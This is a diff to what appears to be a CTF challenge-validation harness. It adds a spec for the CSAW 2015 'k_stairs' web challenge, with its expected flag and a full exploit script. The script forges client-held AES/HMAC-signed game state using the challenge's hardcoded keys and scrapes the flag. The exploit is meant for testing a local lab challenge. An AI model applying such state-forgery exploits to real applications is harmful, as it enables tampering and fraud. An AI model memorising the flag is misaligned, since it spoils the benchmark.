@@ -116,6 +116,151 @@ if r.stderr:
     print(r.stderr)
 """,
     ),
+    "2015q-web-k_stairs": ChallengeSpec(
+        challenge_id="2015q-web-k_stairs",
+        rel=Path("development/2015/CSAW-Quals/web/k_stairs"),
+        port=4567,
+        probe_path="/",
+        expected_flag="KEY{H0000LY_ST41rRs_S0000_MUCH_SPACE}",
+        note="client-held AES/HMAC game state forgery moves player onto stairs",
+        exploit_timeout=20.0,
+        compose_service="server",
+        exploit_script=r"""
+import os
+import re
+import secrets
+import subprocess
+import time
+
+import requests
+
+base = f"http://{os.environ['LOTUS_TARGET_HOST']}:{os.environ['LOTUS_TARGET_PORT']}"
+challenge_dir = os.environ["LOTUS_CHALLENGE_DIR"]
+service = os.environ.get("LOTUS_COMPOSE_SERVICE") or "server"
+
+
+def forge_state_in_container(state):
+    code = r'''
+import base64
+import json
+import sys
+
+from Crypto.Cipher import AES
+from Crypto.Hash import HMAC, SHA256
+from Crypto import Random
+
+enc_key = "i#N@UXAD(V-2FGSbm)F#T9*VlVQglkLu"
+hmac_key = "gZ3np$hTE1jBTZoXS2uxF-ddNjDwj^FH"
+
+
+def decompress_world(data, w, h):
+    size = (w / 2) * h
+    if len(data) != size + 1:
+        raise ValueError("bad world length")
+    world = []
+    checksum = 0
+    key = 0x48
+    for y in range(h):
+        row = []
+        for x in range(w / 2):
+            value = ord(data[(w / 2) * y + x])
+            checksum += value
+            value ^= key
+            key = (key + 0xFF) & 0xFF
+            row.append((value & 0xF0) >> 4)
+            row.append(value & 0x0F)
+        world.append(row)
+    if ord(data[size]) != (checksum & 0xFF):
+        raise ValueError("bad world checksum")
+    return world
+
+
+def compress_world(world, w, h):
+    out = []
+    checksum = 0
+    key = 0x48
+    for y in range(h):
+        for x in range(w / 2):
+            value = ((world[y][x * 2] << 4) | world[y][x * 2 + 1]) ^ key
+            key = (key + 0xFF) & 0xFF
+            checksum += value
+            out.append(chr(value & 0xFF))
+    out.append(chr(checksum & 0xFF))
+    return "".join(out)
+
+
+def decrypt_state(state):
+    packed, world_packed = state.split(":", 1)
+    raw = base64.b64decode(packed)
+    ciphertext = raw[:-SHA256.digest_size]
+    signature = raw[-SHA256.digest_size:]
+    hmac = HMAC.new(hmac_key, digestmod=SHA256)
+    hmac.update(ciphertext)
+    if hmac.digest() != signature:
+        raise ValueError("bad hmac")
+    iv = ciphertext[:AES.block_size]
+    body = ciphertext[AES.block_size:]
+    fields = json.loads(AES.new(enc_key, AES.MODE_CBC, iv).decrypt(body))
+    return {
+        "f": fields,
+        "world": decompress_world(base64.b64decode(world_packed), fields["w"], fields["h"]),
+    }
+
+
+def encrypt_state(state):
+    fields = state["f"]
+    plaintext = json.dumps(fields)
+    plaintext += " " * (AES.block_size - (len(plaintext) % AES.block_size))
+    iv = Random.new().read(AES.block_size)
+    ciphertext = iv + AES.new(enc_key, AES.MODE_CBC, iv).encrypt(plaintext)
+    hmac = HMAC.new(hmac_key, digestmod=SHA256)
+    hmac.update(ciphertext)
+    return "%s:%s" % (
+        base64.b64encode(ciphertext + hmac.digest()),
+        base64.b64encode(compress_world(state["world"], fields["w"], fields["h"])),
+    )
+
+
+state = decrypt_state(sys.stdin.read().strip())
+state["f"]["x"] = state["f"]["sx"]
+state["f"]["y"] = state["f"]["sy"] - 1
+print(encrypt_state(state))
+'''
+    result = subprocess.run(
+        ["docker", "compose", "exec", "-T", service, "python", "-c", code],
+        cwd=challenge_dir,
+        input=state,
+        text=True,
+        capture_output=True,
+        timeout=10,
+        check=False,
+    )
+    if result.returncode != 0:
+        raise RuntimeError(result.stderr or result.stdout)
+    return result.stdout.strip().splitlines()[-1]
+
+
+session = requests.Session()
+for _ in range(20):
+    try:
+        if session.get(base + "/", timeout=2).status_code < 500:
+            break
+    except requests.RequestException:
+        time.sleep(0.5)
+
+username = "u" + secrets.token_hex(4)
+password = secrets.token_hex(8)
+session.post(base + "/register", data={"user": username, "pass": password}, timeout=5)
+new_game = session.get(base + "/new_game", timeout=10).json()
+forged = forge_state_in_container(new_game["state"])
+result = session.post(base + "/action", data={"state": forged, "move": "1"}, timeout=10)
+message = result.json().get("message", "")
+print(message)
+flags = re.findall(r"KEY\{[^}]+\}", message)
+if flags:
+    print(flags[0])
+""",
+    ),
     "2023f-web-shreeramquest": ChallengeSpec(
         challenge_id="2023f-web-shreeramquest",
         rel=Path("test/2023/CSAW-Finals/web/ShreeRamQuest"),
